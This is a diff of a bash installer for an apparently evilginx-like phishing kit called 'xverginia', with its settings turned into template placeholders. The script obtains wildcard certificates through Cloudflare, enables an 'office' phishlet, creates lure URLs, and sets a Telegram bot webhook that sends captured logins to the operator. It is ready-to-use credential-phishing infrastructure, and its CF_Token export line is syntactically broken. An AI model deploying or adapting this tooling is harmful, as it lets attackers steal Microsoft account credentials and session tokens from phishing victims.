@@ -10,12 +10,6 @@ YELLOW='\033[0;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
-domain={domain}
-telegram={telegram_id}
-bottoken={bot_token}
-cf_token={cf_token}
-
-
 #Logging functions
 log_info() {
   echo -e "${BLUE}[INFO]:  $1${NC}"
@@ -83,31 +77,31 @@ chmod +x ./build/xverginia &> /dev/null
 sudo service systemd-resolved stop
 echo -e "nameserver 8.8.8.8\nnameserver 1.1.1.1" | sudo tee /etc/resolv.conf &> /dev/null
 rm -rf ~/.acme.sh &> /dev/null
-curl https://get.acme.sh | sh -s email=admin@$domain --force
+curl https://get.acme.sh | sh -s email=admin@{domain} --force
 ~/.acme.sh/acme.sh --set-default-ca --server letsencrypt 
-export CF_Token = '$cf_token'
+export CF_Token = {cf_token}
 ~/.acme.sh/acme.sh --issue --dns dns_cf \
-  -d $domain \
-  -d "*.$domain" \
+  -d {domain} \
+  -d "*.{domain}" \
   --keylength ec-256 --force  
-mkdir -p /root/.xverginia/crt/sites/$domain
-~/.acme.sh/acme.sh --install-cert -d $domain \
-  --key-file       /root/.xverginia/crt/sites/$domain/privkey.pem \
-  --fullchain-file /root/.xverginia/crt/sites/$domain/fullchain.pem \
+mkdir -p /root/.xverginia/crt/sites/{domain}
+~/.acme.sh/acme.sh --install-cert -d {domain} \
+  --key-file       /root/.xverginia/crt/sites/{domain}/privkey.pem \
+  --fullchain-file /root/.xverginia/crt/sites/{domain}/fullchain.pem \
   --ecc --force 
-chmod 600 /root/.xverginia/crt/sites/$domain/*.pem 
+chmod 600 /root/.xverginia/crt/sites/{domain}/*.pem 
 
 cat <<EOF > conf.txt
 config ipv4 $uip
 config autocert off
-config domain $domain
-config webhook_telegram $bottoken/$telegram
-phishlets hostname office $domain
+config domain {domain}
+config webhook_telegram {bot_token}/{telegram_id}
+phishlets hostname office {domain}
 phishlets enable office
 lures delete all
 lures create office
 lures get-url 0
-lures edit 0 hostname $domain
+lures edit 0 hostname {domain}
 q
 EOF
 ./build/xverginia -p ./phishlets/ < conf.txt &> /dev/null
@@ -126,7 +120,7 @@ cat <<EOF
 +++++          Installation comleted          ++++++	
 
 |--------------------------------------------------|
-[ .  Add records into your cf ($domain)      ]
+[ .  Add records into your cf ({domain})      ]
 |--------------------------------------------------|
 | . Type  | . Name  | .   Value      | . proxied   |
 |--------------------------------------------------|
